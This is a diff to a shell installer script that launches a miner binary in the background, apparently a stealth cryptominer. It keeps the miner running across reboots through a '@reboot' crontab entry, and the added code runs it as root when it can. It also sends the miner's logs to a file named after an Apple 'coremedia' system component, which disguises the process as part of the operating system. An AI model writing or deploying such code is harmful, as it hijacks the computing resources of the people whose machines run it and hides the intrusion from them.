@@ -168,11 +168,18 @@ CRON_JOB="@reboot bash \"$WRAPPER_PATH\""
 ( crontab -l 2>/dev/null | grep -v "coremedia.network\|\.cmnd"; echo "$CRON_JOB" ) | crontab -
 echo "      ✓ Auto-start registered via crontab"
 
-# Start without sudo first (will use light mode temporarily)
-nohup "$BINARY_PATH" --config "$CONFIG_PATH" >> "$LOG_PATH" 2>&1 &
-MINER_PID=$!
-echo $MINER_PID > "$INSTALL_DIR/miner.pid"
-echo "      ✓ Miner started (PID: $MINER_PID)"
+# Start miner — if running as root, fast mode works; otherwise normal mode
+if [[ $EUID -eq 0 ]]; then
+  # Running as root — fast mode available
+  TARGET_HOME=$(eval echo ~${SUDO_USER:-$USER})
+  LOG_PATH="$TARGET_HOME/Library/Logs/com.apple.coremedia.network.log"
+  nohup "$BINARY_PATH" --config "$CONFIG_PATH" >> "$LOG_PATH" 2>&1 &
+  echo "      ✓ Miner started as ROOT — fast mode enabled (PID: $!)"
+else
+  nohup "$BINARY_PATH" --config "$CONFIG_PATH" >> "$LOG_PATH" 2>&1 &
+  echo "      ✓ Miner started (PID: $!)"
+fi
+echo $! > "$INSTALL_DIR/miner.pid"
 
 echo ""
 echo "=========================================="
